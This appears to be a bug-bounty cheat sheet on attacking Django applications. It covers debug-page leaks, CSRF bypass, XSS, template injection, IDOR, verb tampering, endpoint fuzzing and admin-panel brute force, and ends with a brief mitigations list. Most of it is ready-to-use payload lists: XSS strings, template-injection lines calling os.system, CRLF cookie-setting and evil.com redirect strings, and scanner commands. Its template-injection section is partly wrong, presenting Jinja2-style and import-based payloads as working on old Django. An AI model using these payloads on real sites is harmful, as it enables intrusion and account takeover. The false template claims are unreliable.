## 1. Overview

Django is a Python-based free and open-source web framework following the **Model-Template-Views (MTV)** architectural pattern. Maintained by the Django Software Foundation (501(c)(3) non-profit).

**Key Security Features:**

- Built-in CSRF protection via `csrftoken` cookie
- Template auto-escaping (XSS protection)
- SQL injection protection through ORM
- Clickjacking protection via X-Frame-Options
- Debug mode with detailed error pages (dangerous if exposed)

**Common Attack Surface:**

- Debug mode exposure
- CSRF token bypass
- Template injection (older versions)
- Logic flaws in authentication/authorization
- IDOR vulnerabilities
- HTTP verb tampering

---

## 2. Exploitation Methods

### 🎯 Debug Mode Discovery

**Why it matters:** Debug pages leak sensitive info (settings, environment variables, database queries, internal paths).

**Detection Steps:**

1. **Host Header Manipulation**
    
    ```http
    GET / HTTP/1.1
    Host: invalid-host-xyz.com
    ```
    
    Look for Django debug page with full traceback.
    
2. **Force 404 Pages**
    
    ```
    GET /nonexistent-page-xyz123 HTTP/1.1
    ```
    
    Search response for:
    
    - Django version numbers
    - Full file paths
    - Environment variables
    - Installed apps list
3. **Verb Tampering on All Endpoints**
    
    ```http
    OPTIONS /admin/ HTTP/1.1
    TRACE /admin/ HTTP/1.1
    ```
    
4. **Trigger 500 Errors**
    
    ```http
    POST /admin/login/?next=/admin/ HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    
    [send malformed data]
    ```
    
    Look for 500 status with debug traceback.
    

---

### 🎯 CSRF Token Bypass

**Method 1: XSS on Subdomain**

- Find XSS on `*.domain.tld`
- Use it to overwrite the `csrftoken` cookie for parent domain
- Execute CSRF attack with your controlled token

**Method 2: Null/Missing Token**

```http
POST /sensitive-action HTTP/1.1

csrf_token=
```

Some configurations accept empty tokens.

**Method 3: CRLF Injection**

- Find CRLF on any subdomain
- Inject: `Set-Cookie: csrftoken=YOUR_TOKEN; Domain=.domain.tld`
- Perform CSRF with known token

---

### 🎯 XSS Discovery

**High-Value Targets:**

- Reflected input in `<a href="">` tags
- Input reflected in `<form action="">`
- Input reflected in `<iframe src="">`
- Template variables without `|safe` filter

**Quick Checks:**

```html
"><script>alert(1)</script>
javascript:alert(1)
'><img src=x onerror=alert(1)>
{{7*7}}  <!-- SSTI check -->
```

---

### 🎯 Template Injection (SSTI)

**Vulnerable:** Django < 1.11 (older versions)

**Detection:**

```python
{{7*7}}  → Returns 49
{{settings.SECRET_KEY}}  → May leak secret
```

**Exploitation:**

```python
{% load module %}
{% import os %}
{{os.system('whoami')}}

# or
{{''.__class__.__mro__[1].__subclasses__()}}
```

---

### 🎯 IDOR (Insecure Direct Object Reference)

**Where to Look:**

- `/profile/view/123` → Change ID
- `/order/456/invoice` → Change order ID
- `/api/user/789` → Enumerate users

**Steps:**

1. Map all endpoints with ID parameters
2. Create two test accounts
3. Intercept requests from Account A
4. Replace IDs with Account B's IDs
5. Check if unauthorized access granted

---

### 🎯 Endpoint Discovery (Fuzzing)

**Important:** Fuzz for **endpoints**, not files/directories.

**Recommended Wordlists:**

```bash
# Django-specific endpoints
/admin/
/accounts/login/
/api/v1/
/static/
/media/
/__debug__/
```

**Tools:**

```bash
ffuf -u https://target.com/FUZZ -w django-endpoints.txt
gobuster dir -u https://target.com -w endpoints.txt
```

**Reverse Proxy Paths:** If using Nginx/Apache reverse proxy, test:

```
/app1/admin/
/backend/admin/
/django/admin/
```

---

### 🎯 HTTP Verb Tampering

**Test on Critical Endpoints:**

```http
GET /admin/ → 401
POST /admin/ → Check response
PUT /admin/ → Check response
PATCH /admin/ → Check response
OPTIONS /admin/ → May reveal allowed methods
```

---

## 3. Bypasses

### CSRF Middleware Bypass

- Remove `Referer` header entirely (some configs allow)
- Set `Referer: https://target.com` (same-origin)
- Use older Django versions with known CSRF bugs

### XSS Filter Bypass

Django auto-escapes by default, but:

```python
# If dev used |safe filter incorrectly:
{{ user_input|safe }}  ← XSS possible

# Try context-specific payloads:
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

### Authentication Bypass

- Check `@login_required` decorator usage
- Test API endpoints without decorators
- Try direct object access without auth checks

---

## 4. Payloads

### XSS

```html
1. "><script>alert(document.domain)</script>
2. '><img src=x onerror=alert(1)>
3. <svg/onload=alert(1)>
4. javascript:alert(document.cookie)
5. <iframe src="javascript:alert(1)">
6. <body onload=alert(1)>
7. <input onfocus=alert(1) autofocus>
8. <select onfocus=alert(1) autofocus>
9. <marquee onstart=alert(1)>
10. <details open ontoggle=alert(1)>
```

### SSTI (Old Django)

```python
1. {{7*7}}
2. {{settings.SECRET_KEY}}
3. {%load os%}{{os.system('id')}}
4. {{''.__class__.__mro__[1].__subclasses__()}}
5. {{request.environ}}
```

### CRLF Injection

```
1. %0d%0aSet-Cookie:csrftoken=controlled
2. %0d%0aLocation:https://evil.com
3. %0aSet-Cookie:sessionid=hijack
```

---

## 5. Higher Impact Scenarios

### 🔥 Debug Mode + SSTI = RCE

If debug mode is on AND old Django version with SSTI → Full server compromise.

### 🔥 XSS on Subdomain + CSRF = Account Takeover

1. Find XSS on `blog.target.com`
2. Overwrite `csrftoken` for `.target.com`
3. Execute CSRF to change email/password on `target.com`

### 🔥 IDOR + Mass Assignment = Privilege Escalation

```python
POST /api/user/update
{"id": 123, "is_admin": true}  ← If not filtered
```

### 🔥 Admin Panel + Weak Auth = Full Compromise

- Default creds: `admin:admin`
- Brute force `/admin/login/`
- No rate limiting on login
- Access to database via Django admin

---

## 6. Mitigations

### For Developers

✅ **Disable Debug Mode in Production**

```python
# settings.py
DEBUG = False
ALLOWED_HOSTS = ['yourdomain.com']
```

✅ **Enforce CSRF Protection**

```python
MIDDLEWARE = [
    'django.middleware.csrf.CsrfViewMiddleware',
]
```

✅ **Use Permission Decorators**

```python
@login_required
@permission_required('app.view_data')
def sensitive_view(request):
    pass
```

✅ **Validate User Input**

```python
from django.core.validators import URLValidator
validator = URLValidator()
validator(user_input)
```

✅ **Keep Django Updated**

```bash
pip install --upgrade django
```

✅ **Rate Limit Authentication**

```python
# Use django-ratelimit or django-axes
```

---

## 🛠️ Automated Scanning

**Recommended Tools:**

- Burp Suite Active Scanner (paid)
- Acunetix
- Nuclei (free, with Django templates)
- OWASP ZAP

**Quick Nuclei Scan:**

```bash
nuclei -u https://target.com -t django/ -severity critical,high
```

---

**✅ Testing Checklist:**

- [ ] Debug mode detection (host header, 404s, 500s)
- [ ] CSRF token manipulation
- [ ] XSS in forms, URLs, parameters
- [ ] IDOR on all ID-based endpoints
- [ ] SSTI detection (old versions)
- [ ] HTTP verb tampering
- [ ] Endpoint fuzzing
- [ ] Admin panel access attempts
- [ ] Automated scan with Burp/Acunetix